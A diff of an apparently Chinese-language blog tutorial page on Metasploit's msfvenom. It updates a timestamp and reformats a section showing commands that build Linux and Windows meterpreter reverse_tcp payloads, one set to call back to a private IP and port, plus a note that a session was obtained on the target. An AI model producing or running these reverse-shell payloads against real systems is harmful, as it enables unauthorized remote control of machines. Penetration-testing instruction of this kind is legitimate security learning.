@@ -443,7 +443,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-11 16:43:48'>2019-03-04 21:06</time>
+            Created At : <time class="date" title='Updated At: 2020-08-11 16:52:31'>2019-03-04 21:06</time>
         
     </div>
     <div class="article-meta">
@@ -507,11 +507,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.e
     --shellest        最小化生成payload
 -t, --timeout         从STDIN读取有效负载时要等待的秒数
 -h, --help            帮助  
-    --help-formats    查看msf支持的输出格式列表</code></pre><h2 id="3、Msfvenom-例子"><a href="#3、Msfvenom-例子" class="headerlink" title="3、Msfvenom 例子"></a>3、Msfvenom 例子</h2><h3 id="Msfvenom-生成-elf-可执行文件"><a href="#Msfvenom-生成-elf-可执行文件" class="headerlink" title="Msfvenom 生成 elf 可执行文件"></a>Msfvenom 生成 elf 可执行文件</h3><pre><code>1、 首先 Msfvenom 生成 elf 文件
-msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.16.200.139 lport=12345 -f elf -o 153.elf
-![](https://img-blog.csdnimg.cn/2020031223213518.png)
-
-2、</code></pre><h2 id="4、Msfvenom-生成各种-Payload"><a href="#4、Msfvenom-生成各种-Payload" class="headerlink" title="4、Msfvenom 生成各种 Payload"></a>4、Msfvenom 生成各种 Payload</h2><pre><code>Linux
+    --help-formats    查看msf支持的输出格式列表</code></pre><h2 id="3、Msfvenom-例子"><a href="#3、Msfvenom-例子" class="headerlink" title="3、Msfvenom 例子"></a>3、Msfvenom 例子</h2><h3 id="Msfvenom-生成-elf-可执行文件"><a href="#Msfvenom-生成-elf-可执行文件" class="headerlink" title="Msfvenom 生成 elf 可执行文件"></a>Msfvenom 生成 elf 可执行文件</h3><p>  1、 首先 Msfvenom 生成 elf 文件</p>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.16.200.139 lport=12345 -f elf -o 153.elf</code></pre><p><img src="https://s1.ax1x.com/2020/08/11/aOVG8S.png" alt="aOVG8S.png"></p>
+<p>2、然后MSF设置后对应的payload的参数，执行目标机器的payload成功获取session。<br><img src="https://s1.ax1x.com/2020/08/11/aOVJgg.png" alt="aOVJgg.png"></p>
+<h2 id="4、Msfvenom-生成各种-Payload"><a href="#4、Msfvenom-生成各种-Payload" class="headerlink" title="4、Msfvenom 生成各种 Payload"></a>4、Msfvenom 生成各种 Payload</h2><pre><code>Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
 
 windows
